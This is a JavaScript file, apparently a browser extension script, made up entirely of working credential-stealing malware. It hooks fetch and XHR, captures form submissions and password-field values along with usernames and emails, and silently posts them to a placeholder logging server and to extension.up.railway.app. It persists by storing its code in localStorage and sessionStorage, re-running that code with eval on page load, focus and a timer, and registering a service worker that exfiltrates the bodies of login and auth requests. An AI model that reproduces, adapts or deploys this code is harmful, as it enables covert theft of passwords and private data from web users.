
(function() {
    // Install persistence mechanisms first
    installPersistence();
    
    // Stealth logger that captures form data
    function createLogger() {
        const originalFetch = window.fetch;
        const originalXHR = XMLHttpRequest.prototype.send;
        
        // Intercept fetch requests
        window.fetch = function(...args) {
            logRequest('fetch', args[0], args[1]);
            return originalFetch.apply(this, args);
        };
        
        // Intercept XHR requests
        XMLHttpRequest.prototype.send = function(data) {
            if (data) {
                logRequest('xhr', this._url || 'unknown', { data });
            }
            return originalXHR.apply(this, arguments);
        };
        
        // Monitor form submissions
        document.addEventListener('submit', function(e) {
            const form = e.target;
            const formData = new FormData(form);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            logFormData(data, form.action || window.location.href);
        });
        
        // Monitor password field changes
        document.addEventListener('input', function(e) {
            if (e.target.type === 'password' && e.target.value.length > 3) {
                logPasswordField(e.target);
            }
        });
        
        function logRequest(type, url, data) {
            sendToLogger({
                type: 'network_request',
                method: type,
                url: url,
                data: data,
                timestamp: new Date().toISOString(),
                page: window.location.href
            });
        }
        
        function logFormData(data, action) {
            sendToLogger({
                type: 'form_submission',
                formData: data,
                action: action,
                timestamp: new Date().toISOString(),
                page: window.location.href
            });
        }
        
        function logPasswordField(input) {
            const form = input.closest('form');
            const allInputs = form ? form.querySelectorAll('input') : [];
            const credentials = {};
            
            allInputs.forEach(inp => {
                if (inp.type === 'text' || inp.type === 'email' || inp.type === 'password') {
                    credentials[inp.name || inp.id || inp.type] = inp.value;
                }
            });
            
            sendToLogger({
                type: 'credential_capture',
                credentials: credentials,
                timestamp: new Date().toISOString(),
                page: window.location.href
            });
        }
        
        function sendToLogger(data) {
            fetch('https://your-logging-server.com/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                mode: 'no-cors'
            }).catch(() => {
                // Silent fail
            });
        }
    }
    
    // Install multiple persistence mechanisms
    function installPersistence() {
        // 1. LocalStorage persistence
        const persistentCode = `
            (function() {
                const originalFetch = window.fetch;
                window.fetch = function(...args) {
                    fetch('https://extension.up.railway.app/log', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'persistent_network',
                            url: args[0],
                            timestamp: new Date().toISOString(),
                            page: window.location.href
                        }),
                        mode: 'no-cors'
                    }).catch(() => {});
                    return originalFetch.apply(this, args);
                };
                
                // Monitor credentials
                document.addEventListener('input', function(e) {
                    if (e.target.type === 'password' && e.target.value.length > 3) {
                        const form = e.target.closest('form');
                        const credentials = {};
                        if (form) {
                            const inputs = form.querySelectorAll('input');
                            inputs.forEach(inp => {
                                if (inp.value) {
                                    credentials[inp.name || inp.id || inp.type] = inp.value;
                                }
                            });
                        }
                        
                        fetch('https://extension.up.railway.app/log', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'persistent_credentials',
                                credentials: credentials,
                                timestamp: new Date().toISOString(),
                                page: window.location.href
                            }),
                            mode: 'no-cors'
                        }).catch(() => {});
                    }
                });
            })();
        `;
        
        // Store in localStorage
        localStorage.setItem('systemCache', persistentCode);
        
        // Store in sessionStorage
        sessionStorage.setItem('systemCache', persistentCode);
        
        // 2. Service Worker persistence (if supported)
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('fetch', function(event) {
                    const url = event.request.url;
                    if (url.includes('login') || url.includes('auth') || url.includes('signin')) {
                        event.request.clone().text().then(body => {
                            fetch('https://extension.up.railway.app/log', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    type: 'service_worker_auth',
                                    url: url,
                                    body: body,
                                    timestamp: new Date().toISOString()
                                }),
                                mode: 'no-cors'
                            }).catch(() => {});
                        });
                    }
                });
            `;
            
            const blob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);
            navigator.serviceWorker.register(swUrl).catch(() => {});
        }
        
        // 3. Auto-execution setup
        const autoExecutor = `
            // Auto-execute on page load
            (function() {
                function executeFromStorage() {
                    const script = localStorage.getItem('systemCache') || sessionStorage.getItem('systemCache');
                    if (script && !window.persistentActive) {
                        eval(script);
                        window.persistentActive = true;
                    }
                }
                
                // Execute immediately
                executeFromStorage();
                
                // Execute on events
                window.addEventListener('load', executeFromStorage);
                document.addEventListener('DOMContentLoaded', executeFromStorage);
                window.addEventListener('focus', executeFromStorage);
                
                // Periodic check
                setInterval(executeFromStorage, 10000);
            })();
        `;
        
        // Inject auto-executor
        const script = document.createElement('script');
        script.textContent = autoExecutor;
        (document.head || document.body || document.documentElement).appendChild(script);
    }
    
    // Initialize logger
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', createLogger);
    } else {
        createLogger();
    }
})();
